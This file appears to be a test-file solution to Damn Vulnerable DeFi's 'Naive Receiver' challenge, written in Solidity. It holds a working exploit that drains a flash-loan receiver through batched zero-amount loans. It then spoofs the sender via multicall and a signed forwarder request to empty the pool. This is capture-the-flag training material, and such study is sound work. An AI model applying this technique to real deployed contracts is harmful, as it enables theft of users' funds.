// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
	address deployer = makeAddr("deployer");
	address recovery = makeAddr("recovery");
	address player;
	uint256 playerPk;

	uint256 constant WETH_IN_POOL = 1000e18;
	uint256 constant WETH_IN_RECEIVER = 10e18;

	NaiveReceiverPool pool;
	WETH weth;
	FlashLoanReceiver receiver;
	BasicForwarder forwarder;

	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}

	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		(player, playerPk) = makeAddrAndKey("player");
		startHoax(deployer);

		// Deploy WETH
		weth = new WETH();

		// Deploy forwarder
		forwarder = new BasicForwarder();

		// Deploy pool and fund with ETH
		pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

		// Deploy flashloan receiver contract and fund it with some initial WETH
		receiver = new FlashLoanReceiver(address(pool));
		weth.deposit{value: WETH_IN_RECEIVER}();
		weth.transfer(address(receiver), WETH_IN_RECEIVER);

		vm.stopPrank();
	}

	function test_assertInitialState() public {
		// Check initial balances
		assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
		assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

		// Check pool config
		assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
		assertEq(pool.flashFee(address(weth), 0), 1 ether);
		assertEq(pool.feeReceiver(), deployer);

		// Cannot call receiver
		vm.expectRevert(bytes4(hex"48f5c3ed"));
		receiver.onFlashLoan(
			deployer,
			address(weth), // token
			WETH_IN_RECEIVER, // amount
			1 ether, // fee
			bytes("") // data
		);
	}

	/**
	 * CODE YOUR SOLUTION HERE
	 * 
	 * By batching ten transaction to the pool the flash loan receiver
	 * pay 10 times the amount of 1 WETH in fee to the pool.
	 * 
	 * Then can exploit _msgSender() to pass the address of the pool to the withdraw function.
	 * 
	 * 
	 */
	function test_naiveReceiver() public checkSolvedByPlayer {
		
		bytes[] memory callData = new bytes[](11);

		// Create 10 calls to flashLoan in order to empty the FlashLoanReceiver contract
		for ( uint256 i = 0; i < 10 ; i++ )
			callData[i] = abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", receiver, address(weth), 0, "0x");
		callData[10] = abi.encodePacked( abi.encodeWithSignature("withdraw(uint256,address)", WETH_IN_POOL + WETH_IN_RECEIVER, recovery, pool.feeReceiver()));

		console.logBytes( callData[10] );		
		console.logBytes( abi.encodeWithSignature("withdraw(uint256,address)", WETH_IN_POOL + WETH_IN_RECEIVER, recovery) );		
		console.logAddress( pool.feeReceiver() );		
		// Data to execute function
		bytes memory callMulticall = abi.encodeWithSignature("multicall(bytes[])", callData);

		BasicForwarder.Request memory request = BasicForwarder.Request({
			from: player, // me
			target: address(pool), // contract de la pool
			value: 0,
			gas: 1000000,
			nonce: forwarder.nonces(player),
			data: callMulticall, // what I want to execute
			deadline: block.timestamp
		});

		// Signed data
		bytes32 structHash = keccak256(abi.encode(
    		forwarder.getRequestTypehash(),
    		request.from,
    		request.target,
    		request.value,
    		request.gas,
    		request.nonce,
    		keccak256(request.data), // dynamics datas are hashe twice
    		request.deadline
		));
		
		// digest buil following the EIP-712
		bytes32 digest = keccak256( abi.encodePacked(
			"\x19\x01",
			forwarder.domainSeparator(),			// ensure that the signature is unique. Two dApp can have the same data structure to signed
			structHash
		));

		(uint8 v, bytes32 r, bytes32 s) = vm.sign( playerPk, digest );
		bytes memory signature = abi.encodePacked( r, s, v );
		forwarder.execute( request, signature );
	}

	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		// Player must have executed two or less transactions
		assertLe(vm.getNonce(player), 2);

		// The flashloan receiver contract has been emptied
		assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

		// Pool is empty too
		assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

		// All funds sent to recovery account
		assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
	}
}
